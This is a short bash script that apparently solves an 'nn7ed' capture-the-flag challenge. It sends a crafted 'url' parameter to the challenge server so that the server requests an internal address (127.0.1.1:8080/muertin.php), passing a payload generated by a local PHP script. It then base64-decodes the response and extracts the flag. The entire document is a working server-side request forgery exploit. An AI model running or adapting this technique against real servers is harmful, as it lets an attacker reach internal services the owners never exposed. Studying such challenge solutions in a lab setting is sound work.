#!/bin/bash

curl -q 'http://nn7ed.ka0labs.org:6789/' -H 'Content-Type: application/x-www-form-urlencoded'  --data "url=127.0.1.1:8080/muertin.php?pop=$(php muertin.php 2>/dev/null)" 2>/dev/null | grep ".</div>" | sed 's/<\/div>//g' | base64 -d | grep -o "nn7ed{.*}"
